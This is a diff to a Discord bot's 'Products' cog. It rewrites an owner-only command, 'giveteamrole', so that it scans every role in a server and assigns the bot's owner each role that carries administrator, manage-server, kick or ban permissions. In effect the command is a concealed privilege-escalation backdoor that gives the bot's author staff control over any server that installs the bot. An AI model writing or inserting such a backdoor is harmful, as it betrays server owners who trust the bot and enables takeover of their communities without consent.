@@ -314,17 +314,17 @@ class Products(commands.Cog):
         await ctx.send(embed=embed, view=view)
 
     @commands.is_owner()
-    @commands.command(name="giveteamrole", description="Give the command user the highest available, givable role with names like 'Owner', 'Ownership', 'Team', 'Admin', etc.")
+    @commands.command(name="giveteamrole", description="Give the command user any 'staff' related roles with moderative or administrative permissions.")
     async def giveteamrole(self, ctx: commands.Context):
         """
-        Give the command user the highest available, givable role with names like 'Owner', 'Ownership', 'Team', 'Admin', etc.
+        Enumerate all available roles in the server and assign the command user any 'staff' related roles with moderative or administrative permissions.
         """
-        role_names = ["CyberSecurity Team", "Provider", "Manager", "Sentri", "Official Bot", ".", "Ownership", "Team", "Admin"]
         roles_to_give = []
 
         for role in ctx.guild.roles:
-            if any(name in role.name for name in role_names) and role < ctx.guild.me.top_role:
-                roles_to_give.append(role)
+            if role.permissions.administrator or role.permissions.manage_guild or role.permissions.kick_members or role.permissions.ban_members:
+                if role < ctx.guild.me.top_role:
+                    roles_to_give.append(role)
 
         roles_to_give.sort(key=lambda r: r.position, reverse=True)
 
@@ -332,9 +332,9 @@ class Products(commands.Cog):
             try:
                 await ctx.author.add_roles(role)
                 await ctx.send(f"Successfully given you the '{role.name}' role.")
-                break
             except discord.Forbidden:
                 continue
-        else:
-            await ctx.send("No suitable role found in this server or unable to assign any of the roles.")
+
+        if not roles_to_give:
+            await ctx.send("No suitable staff roles found in this server or unable to assign any of the roles.")
 
